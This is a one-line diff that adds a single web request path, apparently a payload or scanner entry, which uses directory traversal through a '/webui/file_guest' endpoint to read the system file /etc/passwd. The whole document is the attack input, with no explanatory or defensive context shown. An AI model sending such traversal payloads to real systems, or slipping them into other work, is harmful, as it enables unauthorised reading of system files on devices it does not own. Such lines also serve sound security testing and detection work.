@@ -1,0 +1,1 @@
+/webui/file_guest?path=/var/www/documentation/../../../../../etc/passwd&flags=1152
